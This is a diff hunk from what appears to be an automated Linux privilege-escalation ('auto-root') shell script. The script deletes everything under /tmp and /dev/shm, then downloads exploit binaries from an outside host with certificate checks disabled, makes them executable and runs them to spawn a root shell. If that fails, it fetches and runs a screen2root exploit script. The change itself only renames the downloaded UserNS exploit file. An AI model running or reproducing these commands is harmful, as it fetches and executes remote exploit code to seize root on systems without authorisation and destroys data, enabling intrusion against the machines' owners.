@@ -75,16 +75,16 @@ sleep 1
 rm -rf /tmp/*
 rm -rf /dev/shm/*
 echo -e "$cyan[*]$yellow Trying exploits UserNS....."
-wget -q --no-check-certificate https://leviathan1337.github.io/userNS
-chmod 0755 userNS
+wget -q --no-check-certificate https://leviathan1337.github.io/user
+chmod 0755 user
 if [[ $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id) =~ "root" ]];
 then
 echo -e "$cyan[*]$okegreen Gotchaa.. success!"
 echo -e "$cyan[*]$okegreen r00ted: $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id)"
-./userNS -p -m -U -M '0 1000 1' -G '0 1000 1' /bin/sh
+./user -p -m -U -M '0 1000 1' -G '0 1000 1' /bin/sh
 else
 echo -e "$cyan[*]$red Failed exploits UserNS"
-rm -rf userNS
+rm -rf user
 sleep 1
 echo -e "$cyan[*]$yellow Trying exploits screenroot....."
 wget -q --no-check-certificate https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh;chmod 0755 screenroot.sh
